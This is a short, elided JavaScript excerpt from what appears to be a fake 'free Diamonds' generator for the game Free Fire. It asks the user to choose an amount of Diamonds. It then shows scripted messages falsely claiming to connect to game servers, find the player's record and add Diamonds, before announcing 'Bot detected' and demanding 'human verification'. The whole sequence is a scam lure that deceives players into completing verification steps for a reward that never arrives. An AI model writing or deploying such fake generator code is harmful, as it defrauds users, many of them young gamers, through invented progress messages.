...
function SKIN() {
  if (VBCHOSEN) {
    ...
    alert("You need to select how much free Diamonds you want.")
  }
}
...
function FIN() {
  ...
  var STRS = ["Initializing connection with FreeFire servers...^1000", "Looking for <u>" + $("#F-username").val() + "</u> record in <u>" + PLATF + "_users</u> table...^1000", "Adding <u>" + VBUCKS + "</u> Diamonds...^1000", "Finishing connection...^1000", "Bot detected...^1000 You need to complete <u>human verification</u> to receive your " + VBUCKS + " Diamonds"]
